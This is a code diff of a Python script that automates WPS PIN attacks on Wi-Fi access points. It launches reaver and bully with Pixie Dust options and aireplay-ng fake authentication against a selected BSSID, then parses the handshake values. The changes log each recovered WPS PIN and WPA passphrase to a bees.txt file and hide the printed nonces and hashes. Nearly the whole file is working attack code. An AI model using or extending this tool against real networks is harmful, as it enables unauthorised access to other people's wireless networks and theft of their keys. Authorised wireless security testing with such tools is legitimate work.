@@ -10,6 +10,7 @@ import multiprocessing
 import argparse
 
 line=""
+LEN=0
 attackmode=0
 bssid=0
 channel=0
@@ -94,7 +95,7 @@ def scan():
       #subprocess.Popen(["sed -i 's/|/,/g' temp.csv"], stdout=DN, stderr=DN, shell=True)
       #subprocess.Popen(["sed -i 's/ //g' temp.csv"], stdout=DN, stderr=DN, shell=True)
       return 0
-		
+
 def choose():
    global choice, bssid, ssid, channel
    try:
@@ -112,7 +113,7 @@ def choose():
    except KeyboardInterrupt:
       clear()
       return 0
-		
+
 def auto(attackmode):
    global bssid, ssid, channel, network_max
    counter = 0
@@ -163,6 +164,10 @@ def kill():
    subprocess.call(['killall', '-s', str(6), 'reaver'], stderr=DN)
    subprocess.call(['killall', '-s', str(6), 'aireplay-ng'], stderr=DN)
    subprocess.call(['killall', '-s', str(6), 'bully'], stderr=DN)
+   if PWD or PIN:
+       text_file = open("bees.txt", "a")
+       text_file.write("SSID: %s\nBSSID: %s\nKey: %s\nPin: %s\n" % (ssid, bssid, PWD, PIN))
+       text_file.close()
    return 0
 
 def bully():
@@ -174,9 +179,9 @@ def bully():
       time.sleep(3)
       cmd2 = ['aireplay-ng', "-1", str(4), '-a', bssid, interface]
       time.sleep(5)
-      cmd3 = ['bully', '-b', bssid, '-c', str(channel), '-v', str(4), '-d', interface]
+      cmd3 = ['bully', '-N', '-C', '-A', '-b', bssid, '-c', str(channel), '-v', str(4), '-d', interface]
       timeout = time.time() + 60
-      proc = subprocess.Popen(cmd3, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+      proc = subprocess.Popen(cmd3, stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
       stdout = []
       subprocess.Popen(cmd2, stdout=DN, stderr=DN)
       while True:
@@ -184,45 +189,54 @@ def bully():
          stdout.append(line)
          if time.time() > timeout:
             break
+         #elif b"'Timeout'" in line:
+         #   print("Status: Timeout")
+         #elif b"'NoAssoc'" in line:
+         #   print("Status: No Association")
          elif b"ENonce" in line and ENonce == "":
             ENonce=line.decode().split(':',1)[1]
             print("E-Nonce: found")
-            print(ENonce)
+            #print(ENonce)
          elif b"PKE" in line and PKE == "":
             PKE=line.decode().split(':',1)[1]
             print("PKE: found")
-            print(PKE)
+            #print(PKE)
          elif b"RNonce" in line and RNonce == "":
             RNonce=line.decode().split(':',1)[1]
             print("R-Nonce: found")
-            print(RNonce)
+            #print(RNonce)
          elif b"PKR" in line and PKR == "":
             PKR=line.decode().split(':',1)[1]
             print("PKR: found")
-            print(PKR)
+            #print(PKR)
          elif b"AuthKey" in line and AuthKey == "":
             AuthKey=line.decode().split(':',1)[1]
             print("AuthKey: found")
-            print(AuthKey)
+            #print(AuthKey)
          elif b"E-Hash1" in line and EHash1 == "":
             EHash1=line.decode().split(':',1)[1]
             print("E-Hash1: found")
-            print(EHash1)
+            #print(EHash1)
          elif b"E-Hash2" in line and EHash2 == "":
             EHash2=line.decode().split(':',1)[1]
             print("E-Hash2: found")
-            print(EHash2)
+            #print(EHash2)
          elif b"PIN" in line and PIN == "":
             PIN=line.decode().split(':',1)[1]
+            PIN=PIN.replace("'", "")
+            PIN=PIN.replace(" ", "")
             print("WPS Pin: found")
-            print(PIN)
+            #print(PIN)
          elif b"KEY" in line and PWD == "":
             PWD=line.decode().split(':',1)[1]
+            PWD=PWD.replace("'", "")
+            PWD=PWD.replace("\n", "")
+            PWD=PWD.replace(" ", "")
             print("Key recovered!")
             keycount = keycount + 1
-            text_file = open("bees.txt", "a")
-            text_file.write("SSID: %s\nBSSID: %s\nKey: %sPin: %s\n\n" % (ssid, bssid, PWD, PIN))
-            text_file.close()
+            #text_file = open("bees.txt", "a")
+            #text_file.write("SSID: %s\nBSSID: %s\nKey: %s\nPin: %s\n\n" % (ssid, bssid, PWD, PIN))
+            #text_file.close()
             kill()
             time.sleep(10)
             break
@@ -230,6 +244,7 @@ def bully():
             kill()
             break
       return 0
+
    except KeyboardInterrupt:
       kill()
    except:
@@ -246,7 +261,7 @@ def reaver():
       time.sleep(3)
       cmd2 = ['aireplay-ng', "-1", str(4), '-a', bssid, interface]
       time.sleep(5)
-      cmd3 = ['reaver', '-i', interface, '-b', bssid, '-c', str(channel), '-vvv',  "-L", "-A", "-P", "-K", str(1)]
+      cmd3 = ['reaver', '-i', interface, '-b', bssid, '-c', str(channel), '-vvv', "-E", "-N", "-L", "-A", "-K", str(1)]
       timeout = time.time() + 60
       proc = subprocess.Popen(cmd3, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
       stdout = []
@@ -259,42 +274,47 @@ def reaver():
          if b"E-Nonce" in line and ENonce == "":
             ENonce=line.decode().split(':',1)[1]
             print("E-Nonce: found")
-            print(ENonce)
+            #print(ENonce)
          elif b"PKE" in line and PKE == "":
             PKE=line.decode().split(':',1)[1]
             print("PKE: found")
-            print(PKE)
+            #print(PKE)
          elif b"R-Nonce" in line and RNonce == "":
             RNonce=line.decode().split(':',1)[1]
             print("R-Nonce: found")
-            print(RNonce)
+            #print(RNonce)
          elif b"PKR" in line and PKR == "":
             PKR=line.decode().split(':',1)[1]
             print("PKR: found")
-            print(PKR)
+            #print(PKR)
          elif b"AuthKey" in line and AuthKey == "":
             AuthKey=line.decode().split(':',1)[1]
             print("AuthKey: found")
-            print(AuthKey)
+            #print(AuthKey)
          elif b"E-Hash1" in line and EHash1 == "":
             EHash1=line.decode().split(':',1)[1]
             print("E-Hash1: found")
-            print(EHash1)
+            #print(EHash1)
          elif b"E-Hash2" in line and EHash2 == "":
             EHash2=line.decode().split(':',1)[1]
             print("E-Hash2: found")
-            print(EHash2)
+            #print(EHash2)
          elif b"WPS pin" in line and PIN == "":
             PIN=line.decode().split(':',4)[1]
+            PIN=PIN.replace("'", "")
+            PIN=PIN.replace(" ", "")
             print("WPS Pin: found")
-            print(PIN)
+            #print(PIN)
          elif b"WPA PSK" in line and PWD == "":
             PWD=line.decode().split(':',1)[1]
+            PWD=PWD.replace("'", "")
+            PWD=PWD.replace("\n", "")
+            PWD=PWD.replace(" ", "")
             print("Key recovered!")
             keycount = keycount + 1
-            text_file = open("bees.txt", "a")
-            text_file.write("SSID: %s\nBSSID: %s\nKey: %sPin: %s\n\n" % (ssid, bssid, PWD, PIN))
-            text_file.close()
+            #text_file = open("bees.txt", "a")
+            #text_file.write("SSID: %s\nBSSID: %s\nKey: %s\nPin: %s\n\n" % (ssid, bssid, PWD, PIN))
+            #text_file.close()
             kill()
             time.sleep(10)
             break
@@ -312,9 +332,9 @@ def reaver():
 
 clear()
 if os.path.isfile("bees.txt"):
-	pass
+    pass
 else:
-	subprocess.call(['touch', 'bees.txt'])
+    subprocess.call(['touch', 'bees.txt'])
 #if os.path.isfile("temp.csv"):
 #   pass
 #else:
